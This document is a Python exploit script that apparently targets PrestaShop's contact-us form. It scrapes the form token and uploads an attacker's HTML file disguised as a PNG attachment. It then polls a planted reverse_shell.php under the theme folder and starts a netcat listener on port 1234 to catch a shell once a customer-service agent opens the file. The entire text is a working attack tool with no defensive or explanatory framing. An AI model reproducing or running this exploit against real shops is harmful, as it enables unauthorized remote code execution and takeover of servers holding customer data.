import requests, subprocess, time, threading
from bs4 import BeautifulSoup

def send_get_requests(url, interval=5):
    while True:
        try:
            response = requests.get(url)
            print(f"GET request to {url}: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error during GET request: {e}")
        time.sleep(interval)


host_url = input("[?] Please enter the URL (e.g., http://prestashop:8000): ")
email = input("[?] Please enter your email: ")
message_content = input("[?] Please enter your message: ")
exploit_path = input("[?] Please provide the path to your HTML file: ")

with open(exploit_path, 'r') as file:
    html_content = file.read()

url = f"{host_url}/contact-us"

response = requests.get(url)
response.raise_for_status()

soup = BeautifulSoup(response.text, 'html.parser')
token = soup.find('input', {'name': 'token'})['value']
cookies = response.cookies

files = {
    'fileUpload': ('test.png', html_content, 'image/png'),
}

data = {
    'id_contact': '2',
    'from': email,
    'message': message_content,
    'url': '',
    'token': token,
    'submitMessage': 'Send'
}

response = requests.post(url, files=files, data=data, cookies=cookies)


def send_get_requests(interval=1):
    url = f"{host_url}/themes/next/reverse_shell.php"
    while True:
        try:
            requests.get(url)
        except requests.RequestException as e:
            print(f"Error during GET request: {e}")
        time.sleep(interval)

thread = threading.Thread(target=send_get_requests)
thread.daemon = True
thread.start()

if response.status_code == 200:
    print(f"[X] Yay! Your exploit was sent successfully!")
    print(f"[X] Once a CS agent clicks on attachment, you'll get a SHELL")
    
    subprocess.call(["nc", "-lnvp", "1234"], shell=False)
    print("[X] netcat is now listening on port 1234. Press Ctrl+C to terminate.")

else:
    print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")
